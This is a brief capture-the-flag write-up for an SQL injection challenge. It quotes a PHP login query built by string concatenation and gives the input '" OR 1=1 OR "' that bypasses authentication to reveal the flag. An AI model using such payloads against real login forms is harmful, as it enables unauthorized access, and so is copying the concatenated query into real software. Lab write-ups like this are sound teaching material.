#Ess Kyuu Ell(20)
##We let Phil in accounting take this one. We had higher hopes for him…
http://159.203.217.155/Injection1/

Simple injection, the source code reveals the query to be:
```php
$query = 'SELECT * FROM Injection1 WHERE username="'.$uname.'" AND password="'.$pswd.'";';
```
Furthermore, the authentication php script has the line:
```php
if ($row["username"] === "admin") {
      echo '<p>Your flag is: '.$row["flag"].'</p>';
    }
```
With this information we can put 'admin' into the username box and @" OR 1=1 OR "'@ (@ symbol used to indicate beginning and end of input to avoid confusion)
This returns the page:

#Welcome!

##Your flag is: phil_should_stick_to_banking

flag: phil_should_stick_to_banking
